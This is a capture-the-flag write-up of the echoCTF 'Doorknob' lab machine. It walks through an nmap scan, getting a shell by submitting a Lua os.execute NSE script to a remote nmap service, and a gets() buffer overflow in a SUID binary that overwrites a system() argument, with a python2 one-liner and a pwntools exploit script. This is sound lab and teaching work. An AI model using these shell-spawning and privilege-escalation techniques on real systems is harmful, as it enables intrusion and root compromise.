### Doorknob EchoCTF

### Difficulty = Intermediate

### IP Address = 10.0.30.92

### Description: Many services are running here, each will get you to the next. Turn the doorknobs the right way and see where each door will lead you to. Each service has its own puzzle for you to solve...

Nmap Scan

```
└─$ nmap 10.0.30.92 -p3753,5900,5901,5902,5903 -oN nmapscan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-16 00:50 WAT
Nmap scan report for 10.0.30.92
Host is up (0.23s latency).

PORT     STATE SERVICE
3753/tcp open  nattyserver
5900/tcp open  vnc
5901/tcp open  vnc-1
5902/tcp open  vnc-2
5903/tcp open  vnc-3

Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds
```

Only 5 ports open i'll connect to each port to know whats happening

Port 3753: I don't really know what to do here smh

```
└─$ telnet 10.0.30.92 3753
Trying 10.0.30.92...
Connected to 10.0.30.92.
Escape character is '^]'.
Operation mode
INPUT: readline
OUTPUT: EOL (\n)
INPUT: lol
OUTPUT: EOL (\n)
!quit
quit
```

Port 5900: I don't know cred yet might attempt a brute force if i don't get a way

```
└─$ telnet 10.0.30.92 5900
Trying 10.0.30.92...
Connected to 10.0.30.92.
Escape character is '^]'.
Welcome to the jetbridge control
Username: lol
Password: 
Invalid username  lol

 _____________________________
< Hey hey you've been warned! >
 -----------------------------
    \
     \
                                   .::!!!!!!!:.
  .!!!!!:.                        .:!!!!!!!!!!!!
  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$ 
      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P 
      $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$# 
      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$* 
      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R" 
        "*$bd$$$$      '*$$$$$$$$$$$o+#" 
             """"          """"""" 
Welcome to the jetbridge control
Username:
```

Port 5901: We need decryption key to access it and if the wrong key is provided it rot13 encodes the menu also the path is of the file is leaked `/services/central-control.functions`

```
└─$ telnet 10.0.30.92 5901
Trying 10.0.30.92...
Connected to 10.0.30.92.
Escape character is '^]'.
Enter decryption key:lol

/services/central-control.functions: line 72: syntax error near unexpected token `fi'
/services/central-control.functions: line 72: `      fi'
1. Pbageby Gbjre Bcrengvbaf
2. Grezvany Bcrengvbaf
3. RKVG

Connection closed by foreign host.
                                                                                                                                                                                                           
┌──(mark㉿haxor)-[~/Desktop/B2B/echoCTF/Doorknob]
└─$ echo "Pbageby Gbjre Bcrengvbaf" | rot13   
Control Tower Operations
```

Port 5902: It requires providing an nse script

```
└─$ telnet 10.0.30.92 5902
Trying 10.0.30.92...
Connected to 10.0.30.92.
Escape character is '^]'.
 _____________________________________
/ Network Mapper Server (works better \
\ with telnet)                        /
 -------------------------------------
    \
     \
                                   .::!!!!!!!:.
  .!!!!!:.                        .:!!!!!!!!!!!!
  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$ 
      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P 
      $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$# 
      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$* 
      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R" 
        "*$bd$$$$      '*$$$$$$$$$$$o+#" 
             """"          """"""" 
Provide an NSE. CTRL+D to end
Starting Nmap 7.70 ( https://nmap.org ) at 2023-02-16 00:13 UTC
NSE: failed to initialize the script engine:
/usr/bin/../share/nmap/nse_main.lua:626: /tmp/nmap.Dlai5vBgsI.nse is missing required field: 'action'
stack traceback:
        [C]: in function 'error'
        /usr/bin/../share/nmap/nse_main.lua:626: in field 'new'
        /usr/bin/../share/nmap/nse_main.lua:828: in local 'get_chosen_scripts'
        /usr/bin/../share/nmap/nse_main.lua:1315: in main chunk
        [C]: in ?

QUITTING!
Connection closed by foreign host.
```
    
From this service we know that it runs nmap but we need to specifier a nse script 

And nmap nse script is a lua file 

Checking [gtfobins](https://gtfobins.github.io/gtfobins/lua/) on how to execute command its done by using `os.execute($command)`

So i'll try it out now on the remote server

```
└─$ telnet 10.0.30.92 5902
Trying 10.0.30.92...
Connected to 10.0.30.92.
Escape character is '^]'.
 _____________________________________
/ Network Mapper Server (works better \
\ with telnet)                        /
 -------------------------------------
    \
     \
                                   .::!!!!!!!:.
  .!!!!!:.                        .:!!!!!!!!!!!!
  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$ 
      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P 
      $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$# 
      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$* 
      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R" 
        "*$bd$$$$      '*$$$$$$$$$$$o+#" 
             """"          """"""" 
Provide an NSE. CTRL+D to end
os.execute('bash')
Starting Nmap 7.70 ( https://nmap.org ) at 2023-02-16 00:20 UTC
bash: /root/.bashrc: Permission denied
nmap@doorknob:/home/nmap$ 
```

It worked 🤓. To call the bash process you need to end the nmap command using `CTRL +D`

I'll get a more stable shell using nc 
![image](https://user-images.githubusercontent.com/113513376/219226097-7c526213-6db9-4385-8174-121e5f1f9895.png)

Searching for suid binaries shows this
![image](https://user-images.githubusercontent.com/113513376/219226489-80ed1f1e-93b9-44c6-a5f5-902d5a21dbf7.png)

I'll upload to my machine to analyze it
![image](https://user-images.githubusercontent.com/113513376/219226887-671542f4-b6cd-4c70-bb29-64fa3be085e5.png)

We see its a x86 binary which is statically meaning that the contents of that file are included at link time. In other words, the contents of the file are physically inserted into the executable

I'll check the protections enabled
![image](https://user-images.githubusercontent.com/113513376/219227235-8d6bb4de-4f5c-4976-b87c-bcc9bcd98a5a.png)

From the result we see that just only Stack Canary and NX is enabled

Now i will run the binary to get an overview of what it does
![image](https://user-images.githubusercontent.com/113513376/219227392-580fe6bd-ef45-4e45-b0d0-d3fc9f8fa197.png)

It asks us to guess the word and win a shell

I'll decompile the binary using ghidra. Because the binary is statically linked it will take some while for ghidra to analyze all the functions

Nevertheless lets get to view the decompiled code

Here's what i'll do first, search for strings in the binary 
![image](https://user-images.githubusercontent.com/113513376/219227669-300ead25-a21e-464b-96a9-5cc32c942d58.png)
![image](https://user-images.githubusercontent.com/113513376/219227803-26c87da5-c5e1-413b-a6c4-930486a43d4c.png)

Now i'll just jump to the function where any of the string is
![image](https://user-images.githubusercontent.com/113513376/219228035-d9dce45f-dfcd-4fb7-8171-642ecf13bcac.png)

From the decompiled code we see the main function also there's no stack canary in the binary i have no idea why checksec said there's stack canary present

Here's the decompiled code

```
undefined4 main(void)

{
  uint __seed;
  long random;
  int iVar1;
  char input [20];
  char random_value [20];
  char id [20];
  time_t local_24;
  int local_20;
  int rand2;
  int rand1;
  int i;
  undefined *local_c;
  
  local_c = &stack0x00000004;
  rand1 = 0x21;
  rand2 = 0x7d;
  strncpy(id,"/usr/bin/id",0x14);
  strncpy(random_value,"ddddddddddddddd",0x14);
  __seed = time(&local_24);
  srandom(__seed);
  for (i = 0; i < 10; i = i + 1) {
    random = rand();
    local_20 = rand1 + random % ((rand2 - rand1) + 1);
    random_value[i] = (char)local_20;
  }
  puts("Guess the word i\'m thinking and you win a shell...");
  gets(input);
  iVar1 = strncmp(input,random_value,0x14);
  if (iVar1 == 0) {
    puts("SUCCESS! Here is my gift to you...");
    setuid(0);
    setgid(0);
    system(id);
  }
  else {
    puts("FAILURE! You didnt guess my word...");
    printf("My word was: %s",random_value);
  }
  return 0;
}
```

From there we know that:

```
1. It does stringcopy of /usr/bin/id to variable id
2. It does stringcopy of ddddddddddddddd to variable random
3. It loops for 9 times that does this `'!' + random % (('!' - '}') + 1) which is saved in local_20
4. Next the value the loop formed is saved in random_value
5. It asks for our input and uses get to receive our input # bug here
6. It then does a string compare of our input to the value in random_value
7. If the check is met it does system on variable id
8. Else it prints failed and the value stored in random_value
```

So the generated random value isn't possible to be known cause there's no way for brute forcing it since each process it runs a new random value is created

The vulnerability that lays in the program is the usage of gets(). Using get doesn't check the amount of bytes passed in and we know that the value it receives is stored in an input buffer which can only hold up to 20 bytes of data

Therefore with gets() being used we can cause a buffer overflow 

What can we do with this ?

From the code the value stored in id is later run with system

```
strncpy(id,"/usr/bin/id",0x14);
setuid(0);
setgid(0);
system(id);
```

So if we can overwrite the value in `id` to `bash` we will get a shell

Firstly we need to get the offset between the input and the id variable 

Here's the stack layout
![image](https://user-images.githubusercontent.com/113513376/219229730-84a430a5-638a-4334-8d04-5450a5b44be7.png)

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main(undefined1 param_1)
             undefined         AL:1           <RETURN>                                XREF[1]:     08049bb4(W)  
             undefined1        Stack[0x4]:1   param_1                                 XREF[1]:     08049b45(*)  
             undefined4        EAX:4          random                                  XREF[1]:     08049bb4(W)  
             undefined4        Stack[0x0]:4   local_res0                              XREF[1]:     08049b4c(R)  
             undefined4        Stack[-0xc]:4  local_c                                 XREF[1]:     08049c86(R)  
             undefined4        Stack[-0x14]:4 i                                       XREF[4]:     08049bab(W), 
                                                                                                   08049bd9(R), 
                                                                                                   08049be0(RW), 
                                                                                                   08049be4(R)  
             undefined4        Stack[-0x18]:4 rand1                                   XREF[3]:     08049b56(W), 
                                                                                                   08049bbe(R), 
                                                                                                   08049bc9(R)  
             undefined4        Stack[-0x1c]:4 rand2                                   XREF[2]:     08049b5d(W), 
                                                                                                   08049bbb(R)  
             undefined4        Stack[-0x20]:4 local_20                                XREF[2]:     08049bce(W), 
                                                                                                   08049bd1(R)  
             undefined1        Stack[-0x24]:1 local_24                                XREF[1]:     08049b93(*)  
             undefined1[20]    Stack[-0x38]   id                                      XREF[2]:     08049b6e(*), 
                                                                                                   08049c4f(*)  
             undefined1[20]    Stack[-0x4c]   random_value                            XREF[4]:     08049b84(*), 
                                                                                                   08049bd6(*), 
                                                                                                   08049c0e(*), 
                                                                                                   08049c70(*)  
             undefined1[20]    Stack[-0x60]   input                                   XREF[2]:     08049bfd(*), 
                                                                                                   08049c12(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:080499f6(*), 
                                                                                          _start:080499fc(*), 080cbd48(*)  

```

Looking at the stack layout we see that:

```
1. The offset of start of input is 0x60
2. The offset of id variable is 0x38
```

Doing the math `0x60 - 0x38 = 0x28` we get the offset

Basically here's the exploit one linear payload
![image](https://user-images.githubusercontent.com/113513376/219230238-235de410-d2e5-4d1b-abb3-b348f9fcc76e.png)

```
python2 -c "print 'A'*0x28 + 'sh'" > payload   
(cat payload;cat) | ./suidflow
```

Now because i'm learning bof i just want to make a local exploit script for it 🤓
![image](https://user-images.githubusercontent.com/113513376/219230384-dc9fc49c-b74c-4b98-a346-a2007252f45e.png)

Script avaialble here [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/echoctf/doorknob/exploit.py)
```
from pwn import *

io = process('./suidflow')

offset = 0x28
overflow = 'A' * offset
sh = 'sh'

payload = overflow + sh

io.sendline(payload)
io.interactive()
```

I'll run it on the remote server binary
![image](https://user-images.githubusercontent.com/113513376/219230612-54a3ed61-ec06-43c5-a520-43a6ae1c0bad.png)

So now i'll get a reverse shell 
![image](https://user-images.githubusercontent.com/113513376/219231123-be64923c-5ac2-415a-9575-29294168391f.png)

Now we know that there are other services running on the host and we initially got the path of the files leaked from error `/services/central-control.functions`

Checking it shows the files for 3 services running on it
![image](https://user-images.githubusercontent.com/113513376/219231397-017d0a04-380c-4a30-8c6c-c8a801083d91.png)

Viewing the content shows the other flags 

On port 5903: Shows a service that we need to choose the correct menu and sub menu within 10seconds
![image](https://user-images.githubusercontent.com/113513376/219234149-a14ca121-d019-4d4d-b2c3-33003f975722.png)

Of cause we can do this manually but scripting would be the best do 

Here's what the script i'll make will do 

```
1. Connect to the remote service
2. Strip out the menu and sub menu number
3. Send the value of menu and sub menu 
4. Receive the flag
```

Script avaialble here [Solve](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/echoctf/doorknob/solve.py)

Running the script gives the flag
![image](https://user-images.githubusercontent.com/113513376/219241374-d9493fed-0e19-4911-bbf8-a477f2488e87.png)


And we're done 

<br> <br>
[Back To Home](../../index.md)



